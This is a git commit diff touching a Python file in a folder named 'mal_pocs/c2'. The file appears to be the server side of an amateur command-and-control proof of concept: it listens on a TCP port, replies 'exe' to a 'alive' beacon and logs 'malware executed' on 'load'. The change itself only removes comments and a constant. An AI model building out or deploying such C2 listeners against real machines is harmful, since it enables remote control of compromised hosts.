ee8c0ce8ff5d81f8482de4213e037140092654c9
a1c43my <sk8flowtheengineer@outlook.com>
2022-05-09 18:03:35 -0500

    Update server.py

--- fun stuff/mal_pocs/c2/server.py
+++ fun stuff/mal_pocs/c2/server.py
@@ -4,25 +4,21 @@ HOST = '0.0.0.0'
 PORT = 2048
 PORTa = 2049
 BUFFER_SIZE = 4096
-SEPARATOR = "-"
 a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 a.bind((HOST,PORT))
 print('server listening')
 a.listen(5)
 connection,address = a.accept()
 
-#print(connection)
-#print(address)
+
 dd = str(connection)
-#print(dd.split())
-#print(f'connection establsihed from : {address}') #f is for printing
 
 while True:
     data = connection.recv(1024)
     if data.decode() == 'alive':
         print(data)
         time.sleep(1)
-        print(f'connection establsihed from : {address[0]}') #f is for printing
+        print(f"connection establsihed from : {address[0]}")
         connection.send('exe'.encode())
     elif data.decode() == 'load':
         print('malware executed')
